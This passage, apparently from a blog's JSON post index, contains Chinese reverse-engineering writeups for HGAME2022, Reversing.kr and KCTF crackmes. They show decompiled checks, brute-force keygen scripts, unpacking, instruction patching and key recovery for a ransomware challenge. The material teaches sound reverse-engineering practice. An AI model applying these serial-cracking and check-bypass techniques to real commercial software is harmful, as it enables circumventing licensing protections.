0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0 }; #endif ","date":"2022-02-04T13:08:32+08:00","image":"/post/hgame2022-writeups/cover_hu135499abd96f0998ee1b80004657897f_2075706_120x120_fill_box_smart1_3.png","permalink":"/post/hgame2022-writeups/","title":"HGAME2022 writeups"},{"content":"CSHOP 按一下回车就通关了\n如果要查看逻辑的话，需要先使用 de4dot 脱壳，然后用 dnSpy 打开\nprivate void Form1_Load(object sender, EventArgs e) { this.lblSu.Text = \u0026#34; \u0026#34;; this.lblGu.Text = \u0026#34; \u0026#34;; this.lblNu.Text = \u0026#34; \u0026#34;; this.lblKu.Text = \u0026#34; \u0026#34;; this.lblZu.Text = \u0026#34; \u0026#34;; this.lblMu.Text = \u0026#34; \u0026#34;; this.lblTu.Text = \u0026#34; \u0026#34;; this.ppppp.Text = \u0026#34; \u0026#34;; this.lblGu.Text = \u0026#34; \u0026#34;; this.lblQu.Text = \u0026#34; \u0026#34;; this.ppppp.Text = \u0026#34; \u0026#34;; this.lblTu.Text = \u0026#34; \u0026#34;; this.lblXu.Text = \u0026#34; \u0026#34;; } // Token: 0x06000004 RID: 4 RVA: 0x000021B0 File Offset: 0x000003B0 \tprivate void btnStart_Click(object sender, EventArgs e) { this.lblSu.Text = \u0026#34;W\u0026#34;; this.lblGu.Text = \u0026#34;5\u0026#34;; this.lblNu.Text = \u0026#34;4\u0026#34;; this.lblKu.Text = \u0026#34;R\u0026#34;; this.lblZu.Text = \u0026#34;E\u0026#34;; this.lblMu.Text = \u0026#34;6\u0026#34;; this.lblTu.Text = \u0026#34;M\u0026#34;; this.ppppp.Text = \u0026#34;I\u0026#34;; this.lblGu.Text = \u0026#34;P\u0026#34;; this.lblQu.Text = \u0026#34;S\u0026#34;; this.ppppp.Text = \u0026#34;P\u0026#34;; this.lblTu.Text = \u0026#34;6\u0026#34;; this.lblXu.Text = \u0026#34;S\u0026#34;; } 一开始的 Text 被设置为了空格，而在点击了某个键之后就会设置为具体的值，所以按一下回车就能看到 flag\nPosition 这道题是 MFC 逆向\n利用 Right 和 Wrong 字符串找到逻辑\nvoid __thiscall sub_401CD0(char *this) { int v2; // eax  CWnd *v3; // ecx  v2 = sub_401740((int)this); v3 = (CWnd *)(this + 188); if ( v2 ) CWnd::SetWindowTextW(v3, L\u0026#34;Correct!\u0026#34;); else CWnd::SetWindowTextW(v3, L\u0026#34;Wrong\u0026#34;); } sub_401740 就是验证逻辑\nCWnd::GetWindowTextW(a1 + 304, \u0026amp;v50); if ( *(_DWORD *)(v50 - 12) == 4 ) 第一步验证输入长度是否为 4\nv3 = 0; while ( (unsigned __int16)ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v50, v3) \u0026gt;= 0x61u \u0026amp;\u0026amp; (unsigned __int16)ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v50, v3) \u0026lt;= 0x7Au ) { if ( ++v3 \u0026gt;= 4 ) { LABEL_7: v4 = 0; while ( 1 ) { if ( v1 != v4 ) { v5 = ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v50, v4); if ( (unsigned __int16)ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v50, v1) == v5 ) goto LABEL_2; } 随后利用双重循环，约束输入为小写字母并且没有重复\nCWnd::GetWindowTextW(a1 + 420, \u0026amp;v51); if ( *(_DWORD *)(v51 - 12) == 11 \u0026amp;\u0026amp; (unsigned __int16)ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v51, 5) == 45 ) { v6 = ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v50, 0); v40 = (v6 \u0026amp; 1) + 5; v48 = ((v6 \u0026amp; 0x10) != 0) + 5; v42 = ((v6 \u0026amp; 2) != 0) + 5; v44 = ((v6 \u0026amp; 4) != 0) + 5; v46 = ((v6 \u0026amp; 8) != 0) + 5; v7 = ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v50, 1); v32 = (v7 \u0026amp; 1) + 1; v38 = ((v7 \u0026amp; 0x10) != 0) + 1; v34 = ((v7 \u0026amp; 2) != 0) + 1; v8 = ((v7 \u0026amp; 4) != 0) + 1; v36 = ((v7 \u0026amp; 8) != 0) + 1; Buffer = (wchar_t *)ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetBuffer(v52); itow_s(v40 + v8, Buffer, 0xAu, 10); v10 = ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(v52, 0); if ( (unsigned __int16)ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v51, 0) == v10 ) 上面的 if 语句要求了 serial，下面的 if 要求了 v40 + v8 需要等于输入的第一位\n同样的逻辑，约束了 v46 + v36 等于输入的第二位\n直接写个脚本爆破一下\nfor v6 in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): for v7 in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): v40 = (v6 \u0026amp; 1) + 5 v48 = ((v6 \u0026amp; 0x10) != 0) + 5 v42 = ((v6 \u0026amp; 2) != 0) + 5 v44 = ((v6 \u0026amp; 4) != 0) + 5 v46 = ((v6 \u0026amp; 8) != 0) + 5 v32 = (v7 \u0026amp; 1) + 1 v38 = ((v7 \u0026amp; 0x10) != 0) + 1 v34 = ((v7 \u0026amp; 2) != 0) + 1 v8 = ((v7 \u0026amp; 4) != 0) + 1 v36 = ((v7 \u0026amp; 8) != 0) + 1 if (v40 + v8 == 7 and v46 + v36 == 6 and v42 + v38 == 8 and v44 + v32 == 7 and v48 + v34 == 6): print (chr(v6) + chr(v7)) # bu # cq # ft # gp print () for v19 in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): # for v20 in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): v20 = ord(\u0026#39;p\u0026#39;) v41 = (v19 \u0026amp; 1) + 5 v49 = ((v19 \u0026amp; 0x10) != 0) + 5 v43 = ((v19 \u0026amp; 2) != 0) + 5 v45 = ((v19 \u0026amp; 4) != 0) + 5 v47 = ((v19 \u0026amp; 8) != 0) + 5 v33 = (v20 \u0026amp; 1) + 1 v39 = ((v20 \u0026amp; 0x10) != 0) + 1 v35 = ((v20 \u0026amp; 2) != 0) + 1 v21 = ((v20 \u0026amp; 4) != 0) + 1 v37 = ((v20 \u0026amp; 8) != 0) + 1 if (v41 + v21 == 7 and v47 + v37 == 7 and v43 + v39 == 7 and v45 + v33 == 7 and v49 + v35 == 6): print (chr(v19) + chr(v20)) # mp 本题多解，但平台好像只认 bump\nRansomware 脱壳，然后发现有大量的无效指令\npush eax pop eax push ebx pop ebx pusha popa 要查看 main 的逻辑直接把开头几条指令 patch 下来就行\n\r\n重新生成一个函数就能看到反编译结果了\n\r\n根据 readme 可知，被加密的是一个 exe 文件，所以把 file 的前十六个字节作为明文，run.exe 的前十六个字节作为密文，算一下密钥\na = \u0026#39;DE C0 1B 8C 8C 93 9E 86 98 97 9A 8C 73 6C 9A 8B\u0026#39;.split() a = [int(i, 16) for i in a] # a = [222, 192, 27, 140, 140, 147, 158, 134, 152, 151, 154, 140, 115, 108, 154, 139] p = \u0026#39;4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00\u0026#39;.split() p = [int(i, 16) for i in p] # p = [77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0] for i, j in zip(a, p): print (chr((~i \u0026amp; 0xff) ^ j), end=\u0026#39;\u0026#39;) # letsplaychesslet 显然 Key 是 letsplaychess\n运行一下得到新的 exe，脱壳反汇编\n\r\nHateIntel 根据字符串找到关键函数\n\r\n查看加密函数\n\r\n总共 4 轮，加密是单字节循环左移 4 位\n解密\ncipher = [ 0x44, 0xF6, 0xF5, 0x57, 0xF5, 0xC6, 0x96, 0xB6, 0x56, 0xF5, 0x14, 0x25, 0xD4, 0xF5, 0x96, 0xE6, 0x37, 0x47, 0x27, 0x57, 0x36, 0x47, 0x96, 0x03, 0xE6, 0xF3, 0xA3, 0x92 ] def dec_byte(a, b): return ((a \u0026gt;\u0026gt; b) | (a \u0026lt;\u0026lt; (8 - b))) \u0026amp; 0xff for c in cipher: print (chr(dec_byte(c, 4)), end=\u0026#39;\u0026#39;) # Do_u_like_ARM_instructi0n?:) Multiplicative 反编译结果\npublic class JavaCrackMe { public static final strictfp void main(String[] arg6) { Class v1 = JavaCrackMe.class; __monitor_enter(v1); try { System.out.println(\u0026#34;Reversing.Kr CrackMe!!\u0026#34;); System.out.println(\u0026#34;-----------------------------\u0026#34;); System.out.println(\u0026#34;The idea came out of the warsaw\\\u0026#39;s crackme\u0026#34;); System.out.println(\u0026#34;-----------------------------\\n\u0026#34;); if(((long)Long.decode(arg6[0])) * 0x6869L == -1536092243306511225L) { System.out.println(\u0026#34;Correct!\u0026#34;); } else { System.out.println(\u0026#34;Wrong\u0026#34;); } } catch(Exception v0_1) { try { System.out.println(\u0026#34;Please enter a 64bit signed int\u0026#34;); } catch(Throwable v0) { __monitor_exit(v1); throw v0; } } catch(Throwable v0) { __monitor_exit(v1); throw v0; } __monitor_exit(v1); } } 参数进行乘法后等于某个数字\n由于并不能整除，所以运算有溢出，一个方法是直接求逆元，另一种方法是爆破溢出位\n方法一：\nIn [3]: from libnum import * In [5]: tar = -1536092243306511225 \u0026amp; 0xffffffffffffffff In [8]: hex(tar * invmod(0x6869, 0x10000000000000000) % 0x10000000000000000) Out[8]: \u0026#39;0x83676f67696c676f\u0026#39; In [12]: (-0x83676f67696c676f) \u0026amp; 0xffffffffffffffff Out[12]: 8978084842198767761 In [13]: hex(8978084842198767761) Out[13]: \u0026#39;0x7c98909896939891\u0026#39; In [14]: hex(-8978084842198767761 \u0026amp; 0xffffffffffffffff) Out[14]: \u0026#39;0x83676f67696c676f\u0026#39; 方法二：\nIn [23]: i = 0 In [24]: while True: ...: if (0xeaaeb43e477b8487 + (i \u0026lt;\u0026lt; 64)) % 0x6869 == 0: ...: break ...: i += 1 ...: In [25]: i Out[25]: 13719 In [26]: hex((0xeaaeb43e477b8487 + (i \u0026lt;\u0026lt; 64)) // 0x6869) Out[26]: \u0026#39;0x83676f67696c676f\u0026#39; In [27]: -((0xeaaeb43e477b8487 + (i \u0026lt;\u0026lt; 64)) // 0x6869) \u0026amp; 0xffffffffffffffff Out[27]: 8978084842198767761 运行结果\n$ java -jar JavaCrackMe.jar -8978084842198767761 Reversing.Kr CrackMe!! ----------------------------- The idea came out of the warsaw\u0026#39;s crackme ----------------------------- Correct! LOTTO 输入需要通过的是一个随机数的逻辑\n\r\n直接修改 ip 跳过即可\n 夜影还给出了一个有意思的方法：另写了一个程序，将相同 srand(time64(0)) 生成的随机数 echo 传入这个程序\n ImagePrc MFC 逆向\n根据字符串 Wrong 可以定位到关键函数\n注意到\nGetObjectA(hbm, 24, pv); memset(\u0026amp;bmi, 0, 0x28u); bmi.bmiHeader.biHeight = cLines; bmi.bmiHeader.biWidth = v16; bmi.bmiHeader.biSize = 40; bmi.bmiHeader.biPlanes = 1; bmi.bmiHeader.biBitCount = 24; bmi.bmiHeader.biCompression = 0; GetDIBits(hdc, (HBITMAP)hbm, 0, cLines, 0, \u0026amp;bmi, 0); v8 = operator new(bmi.bmiHeader.biSizeImage); GetDIBits(hdc, (HBITMAP)hbm, 0, cLines, v8, \u0026amp;bmi, 0); v9 = FindResourceA(0, (LPCSTR)0x65, (LPCSTR)0x18); v10 = LoadResource(0, v9); v11 = LockResource(v10); v12 = 0; v13 = v8; v14 = v11 - (_BYTE *)v8; while ( *v13 == v13[v14] ) { ++v12; ++v13; if ( v12 \u0026gt;= 90000 ) { sub_401500(v8); return 0; } } 从资源中加载 90000 字节并比较\n动调或者 Resource Hacker dump 下来\n判断要求绘制的位图需要相同\nPIL 转成图片\nfrom PIL import Image fp = open(\u0026#39;export_results.txt\u0026#39;, \u0026#39;rb\u0026#39;) pic = fp.read() im = Image.new(\u0026#34;RGB\u0026#34;, (0xc8, 0x96)) for i in range(0, len(pic), 3): im.putpixel(((i // 3) % 0xc8, (i // 3) // 0xc8), (pic[i], pic[i + 1], pic[i + 2])) im = im.transpose(Image.FLIP_TOP_BOTTOM) im.show() Flash Encrypt 使用 ffdec 反编译\n可以看到每个帧的 AS 脚本，使用自动去混淆即可\n// frame1 on(release){ if(spw == 1456) { gotoAndPlay(3); } else { _root.spw = \u0026#34;\u0026#34;; } } // frame2 on(release){ if(spwd == 8) { spw /= spwd; spwd = \u0026#34;\u0026#34;; gotoAndPlay(6); } } // frame3 on(release){ if(spwd == 25) { spw *= spwd; spwd = \u0026#34;\u0026#34;; gotoAndPlay(4); } } // frame4 on(release){ if(spwd == 44) { spw += spwd; spwd = \u0026#34;\u0026#34;; gotoAndPlay(2); } } // frame5 on(release){ if(spwd == 20546) { spw %= spwd; spwd = \u0026#34;\u0026#34;; gotoAndPlay(7); } } // frame6 on(release){ if(spwd == 88) { spw *= spwd; spwd = \u0026#34;\u0026#34;; gotoAndPlay(5); } } gotoAndPlay 中的数字为帧数\n所以输入的顺序为 1456, 25, 44, 8, 88, 20546\n因为不想装 flash，所以想自己写脚本把这个结果算出来，但是发现怎么算都不对\n最后发现原因是 flash 是用字符串进行的计算，猜测 flash 中 \u0026quot;1\u0026quot; == 1，需要根据运算符猜测是字符串运算还是整数运算还是浮点数运算\n一个能得出正确答案的计算过程（加法为字符串拼接，除法保留小数）\n\u0026gt;\u0026gt;\u0026gt; 1456 * 25 36400 \u0026gt;\u0026gt;\u0026gt; 3640044 / 8 455005.5 \u0026gt;\u0026gt;\u0026gt; 3640044 / 8 * 88 40040484.0 \u0026gt;\u0026gt;\u0026gt; 3640044 / 8 * 88 % 20546 16876.0 16876 就是 key\n","date":"2022-01-13T20:41:50+08:00","image":"/post/reversing-kr-writeups/cover_hu34624e491264541cebc0dd205ae52fb1_4568716_120x120_fill_box_smart1_3.png","permalink":"/post/reversing-kr-writeups/","title":"Reversing.kr writeups"},{"content":"有些题还是很值得补的，最近没什么时间，假期补吧（\n第一题 签到 这题还是比较容易的，需要一点点动调的经验\n上张队友的截图吧，懒得自己截了\n\r\n动调看看内存就知道，流程是：\nserial-\u0026gt;十进制-\u0026gt;与name的crc异或-\u0026gt;计算crc\n最后需要是一个固定的值，于是只需要想办法反解就行了\n这里注意到了一个事情，那就是图中看似是对 v6 的 crc 结果做了约束，其实是对 v6 本身进行了约束\n由于题目给了一个实例的 name 和 serial，我们只需要动调拿到这个的 v6，就知道能通过验证的 v6 是多少了\n接下来动调拿一下 KCTF 的 crc，这个的结果再异或一下目标的 v6，就得到serial了\n 靠记忆写的，希望没错\n 第二题 迷失丛林  这题就直接放提交的wp了\n 很容易定位到程序的输入\n\r\n输入长度为32，需要通过 sub_4014A0, sub_401580 的验证\n4014A0 较为简单，是个经典的hexstr转成char存到 4041F0 这个地址，最后的16是计算转换后的长度，所以输入就是 [0-9A-F]{32}\n随后将输入的前八字节存入 404000 中，剩下的部分传参进 sub_401580\n要想让该函数返回1，需要先通过如下的if验证\n\r\n简单看一下使用的变量，应该是对前八字节的输入进行的验证\n\r\n结合动调发现大概就是根据404000数组，构成一个 \u0026lt;value, index\u0026gt; 的结构，两两存放到404420当中\n分析了一下404000数组的作用和特征，发现这个数组应该是构成一个环状的结构（以当前数值作为索引寻找下一个数），猜测不能有重复的数字，否则可能会构成小循环之类的，用脚本验证了一下发现后面248个数字果然没有重复，于是将前八字节的取值可能锁定到了 0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb 中，总共有 $8!=40320$ 种可能，完全可以爆破\n把ida代码复制下来改一改\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdint.h\u0026gt;#include \u0026lt;algorithm\u0026gt;#include \u0026lt;cstring\u0026gt; unsigned char byte_404000[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x9B, 0xF4, 0xDF, 0xAC, 0x7C, 0xA1, 0xC6, 0x16, 0xD0, 0x0F, 0xDD, 0xDC, 0x73, 0xC5, 0x6B, 0xD1, 0x96, 0x47, 0xC2, 0x26, 0x67, 0x4E, 0x41, 0x82, 0x20, 0x56, 0x9A, 0x6E, 0x33, 0x92, 0x88, 0x29, 0xB5, 0xB4, 0x71, 0xA9, 0xCE, 0xC3, 0x34, 0x50, 0x59, 0xBF, 0x2D, 0x57, 0x22, 0xA6, 0x30, 0x04, 0xB2, 0xCD, 0x36, 0xD5, 0x68, 0x4D, 0x5B, 0x45, 0x9E, 0x85, 0xCF, 0x9D, 0xCC, 0x61, 0x78, 0x32, 0x76, 0x31, 0xE3, 0x80, 0xAD, 0x39, 0x4F, 0xFA, 0x72, 0x83, 0x4C, 0x86, 0x60, 0xB7, 0xD7, 0x63, 0x0C, 0x44, 0x35, 0xB3, 0x7B, 0x19, 0xD4, 0x69, 0x08, 0x0B, 0x1F, 0x3D, 0x11, 0x79, 0xD3, 0xEE, 0x93, 0x42, 0xDE, 0x23, 0x3B, 0x5D, 0x8D, 0xA5, 0x77, 0x5F, 0x58, 0xDB, 0x97, 0xF6, 0x7A, 0x18, 0x52, 0x15, 0x74, 0x25, 0x62, 0x2C, 0x05, 0xE8, 0x0D, 0x98, 0x2A, 0x43, 0xE2, 0xEF, 0x48, 0x87, 0x49, 0x1C, 0xCA, 0x2B, 0xA7, 0x8A, 0x09, 0x81, 0xE7, 0x53, 0xAA, 0xFF, 0x6F, 0x8E, 0x91, 0xF1, 0xF0, 0xA4, 0x46, 0x3A, 0x7D, 0x54, 0xEB, 0x2F, 0xC1, 0xC0, 0x0E, 0xBD, 0xE1, 0x6C, 0x64, 0xBE, 0xE4, 0x02, 0x3C, 0x5A, 0xA8, 0x9F, 0x37, 0xAF, 0xA0, 0x13, 0xED, 0x1B, 0xEC, 0x8B, 0x3E, 0x7E, 0x27, 0x99, 0x75, 0xAB, 0xFE, 0xD9, 0x3F, 0xF3, 0xEA, 0x70, 0xF7, 0x95, 0xBA, 0x1D, 0x40, 0xB0, 0xF9, 0xE5, 0xF8, 0x06, 0xBC, 0xB6, 0x03, 0xC9, 0x10, 0x9C, 0x2E, 0x89, 0x5C, 0x7F, 0xB1, 0x1A, 0xD6, 0x90, 0xAE, 0xDA, 0xE6, 0x5E, 0xB9, 0x84, 0xE9, 0x55, 0xBB, 0xC7, 0x0A, 0xE0, 0x66, 0xF2, 0xD8, 0xCB, 0x00, 0x12, 0xB8, 0x17, 0x94, 0x6A, 0x4A, 0x01, 0x24, 0x14, 0x51, 0x07, 0x65, 0x21, 0xC8, 0x38, 0xFD, 0x8F, 0xC4, 0xF5, 0xFC }; unsigned char byte_404220[520]; unsigned char byte_404420[65537]; int dword_404100[] = {2, 4, 8, 0x10, 0x20, 0x40, 0x80, 0}; using namespace std; int sub_401580(unsigned char *a2) { int v2; // ebp  unsigned char *v3; // eax  int *v4; // esi  unsigned char *v5; // ecx  int v6; // edi  unsigned char *v7; // ecx  int v8; // edx  unsigned char *v9; // eax  int v10; // ecx  int v11; // esi  int v12; // eax  unsigned char v13; // dl  int v14; // edi  int v15; // eax  int v16; // ecx  int v17; // esi  int i; // eax  char v19; // dl  unsigned char v21; // [esp+10h] [ebp-Ch]  unsigned char v22; // [esp+11h] [ebp-Bh]  unsigned char v23; // [esp+12h] [ebp-Ah]  unsigned char v24; // [esp+13h] [ebp-9h]  unsigned char *v25; // [esp+14h] [ebp-8h]  v21 = 0; v22 = 0; v23 = 0; v24 = 0; v2 = 1; v25 = byte_404420; for (i = 0; i \u0026lt; 8; i++) byte_404000[i] = a2[i]; do { byte_404220[0] = byte_404000[v2 - 1]; byte_404220[1] = v2; v3 = byte_404220; v4 = dword_404100; v5 = \u0026amp;byte_404220[dword_404100[0]]; do { v6 = *v4; // 2, 4, 8, 10h, 20h, 40h, 80h  if ( *v4 \u0026gt; 0 ) { do { v7 = v5 + 1; *(v7 - 1) = byte_404000[*v3]; *v7 = *v3 + 1; v5 = v7 + 1; ++v3; --v6; } while ( v6 ); } ++v4; } while ( v4 \u0026lt; \u0026amp;(dword_404100[7]) ); v8 = 256; do { ++v25[*v3++]; --v8; } while ( v8 ); ++v2; v25 += 256; } while ( v2 - 1 \u0026lt; 256 ); v9 = \u0026amp;byte_404420[0x28]; v10 = 256; do { if ( *(v9 - 40) ) ++v21; if ( *(v9 - 26) ) ++v22; if ( *v9 ) ++v23; if ( v9[39] ) ++v24; v9 += 256; --v10; } while ( v10 ); if ( v21 == 0xA9 \u0026amp;\u0026amp; v22 == 0xAC \u0026amp;\u0026amp; v23 == 0xA7 \u0026amp;\u0026amp; v24 \u0026gt; 0xC8u ){ for (i = 0; i \u0026lt; 8; i++){ printf(\u0026#34;%hhX\u0026#34;, a2[i]); } } return 0; } int main(){ unsigned char flag[] = {0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb}; do{ memset(byte_404420, 0, 65536); sub_401580(flag); }while (next_permutation(flag, flag + 8)); return 0; } 转换一下得到前八字节 B4D682C8BF2DE13A\n确定前八字节后，只需要关注和参数（后八字节）有关的部分了，中间全部动调跳过\n\r\n这一部分程序相较来说就简单了不少，主要是根据404000开头的八个字节作为初始值，每个字节单独与输入的八个字节进行运算，根据末尾bit决定是+1还是找索引，最终目的是凑成 GoodJob~ 这个字符串（sub_4024C0 是个字符串比较）\n可以使用搜索之类的，但考虑到每个字节是单独运算的，常规爆破也只需要 0x800 的运算量，所以还是直接爆破了\n#include \u0026lt;stdio.h\u0026gt; unsigned char byte_414420[] = {0xC1, 0x9B, 0x7F, 0x58, 0x64, 0xD5, 0x77, 0x21}; unsigned char byte_404000[] = { 0xC1, 0x9B, 0x7F, 0x58, 0x64, 0xD5, 0x77, 0x21, 0x74, 0xEB, 0x14, 0xBF, 0xDF, 0x25, 0x5A, 0x37, 0x85, 0x2C, 0xAF, 0x8C, 0xDA, 0x26, 0xE2, 0x7A, 0x87, 0x4C, 0x60, 0x99, 0x54, 0x3C, 0x95, 0xC0, 0xB9, 0x0C, 0xBC, 0x0E, 0xE7, 0x2D, 0x86, 0xBE, 0x67, 0xD3, 0xD8, 0xFC, 0x30, 0xB6, 0xC8, 0x57, 0x1E, 0x62, 0x3E, 0xCE, 0xA0, 0xCD, 0xF5, 0xEE, 0xA7, 0xCF, 0x45, 0xFE, 0xD0, 0x80, 0x05, 0xAD, 0x13, 0xF3, 0xB7, 0x6B, 0x22, 0x2B, 0xBD, 0x69, 0x42, 0x4B, 0xA5, 0xEA, 0xA6, 0xD2, 0x6F, 0x4F, 0x4E, 0x07, 0xE1, 0x36, 0x01, 0xB5, 0xAA, 0xB1, 0x94, 0x0B, 0x35, 0x3A, 0xC7, 0x49, 0x53, 0x82, 0xC3, 0x7B, 0x32, 0xFF, 0x19, 0xC4, 0xF1, 0xC9, 0xE8, 0xF7, 0x56, 0x15, 0xA3, 0x46, 0x89, 0x43, 0x9D, 0x8F, 0x20, 0xEF, 0xBB, 0x2A, 0xCB, 0x09, 0x93, 0x4A, 0x1C, 0xE3, 0x33, 0xD1, 0xE0, 0x1D, 0x72, 0x7C, 0x27, 0xE9, 0x17, 0x28, 0x6D, 0x6A, 0xD9, 0x00, 0x9A, 0xE5, 0x63, 0xDE, 0x23, 0x9F, 0x0D, 0x47, 0x3B, 0x65, 0x08, 0x84, 0x6C, 0x1A, 0x88, 0x12, 0xA1, 0xA4, 0xB3, 0x18, 0x24, 0x1B, 0xD7, 0x44, 0xDB, 0xAC, 0x6E, 0x7D, 0x51, 0x5E, 0xED, 0x50, 0xD6, 0x11, 0x5B, 0x9C, 0xB4, 0x68, 0x3D, 0x2F, 0x03, 0x40, 0xBA, 0x2E, 0xCA, 0x02, 0xE6, 0xA8, 0xEC, 0x83, 0x06, 0x5D, 0xB8, 0x4D, 0x97, 0x66, 0xF0, 0xFB, 0x8A, 0x55, 0xAB, 0xB2, 0x04, 0xFA, 0x0A, 0x31, 0x71, 0xCC, 0x8B, 0x73, 0xA9, 0x48, 0x5C, 0xF9, 0x98, 0xE4, 0xC6, 0x34, 0xC5, 0x7E, 0x81, 0x75, 0x90, 0x1F, 0x92, 0x3F, 0x9E, 0x10, 0x29, 0x52, 0x39, 0xF4, 0x41, 0x78, 0x5F, 0x16, 0x79, 0xC2, 0xB0, 0xDD, 0xF2, 0x61, 0x0F, 0x70, 0xD4, 0x91, 0xDC, 0xF6, 0xF8, 0xFD, 0x59, 0x38, 0x8D, 0x96, 0xAE, 0x8E, 0x76, 0xA2 }; int calc(unsigned char a2, int i){ int v17; // esi  char v19; // dl  v17 = 0; do { if ( v17 \u0026gt;= 8 ) { if ( !i || i == 7 ) --byte_414420[i]; } else { if ( (a2 \u0026amp; 1) != 0 ) v19 = byte_414420[i] + 1; else v19 = byte_404000[byte_414420[i]]; byte_414420[i] = v19; a2 \u0026gt;\u0026gt;= 1; } ++v17; } while ( v17 \u0026lt; 9 ); return byte_414420[i]; } int main(){ int i = 0; unsigned char a = 0; unsigned char b[] = \u0026#34;GoodJob~\u0026#34;; for (int j = 0; j \u0026lt; 8; j++){ for (i = 0; i \u0026lt; 0x100; i++){ a = i \u0026amp; 0xff; for (int k = 0; k \u0026lt; 8; k++){ byte_414420[k] = byte_404000[k]; } calc(a, j); if (byte_414420[j] == b[j]) printf(\u0026#34;%d %x\\n\u0026#34;, j, a); } } return 0; } 最后得到下半段验证码 D9B6AEF24A80CB22\n第七题 声名远扬  这题做完后懒了，没有交wp\n 初步分析了一下，看到一些字符串，发现这题用了 duilib 架构\n很多人的 wp 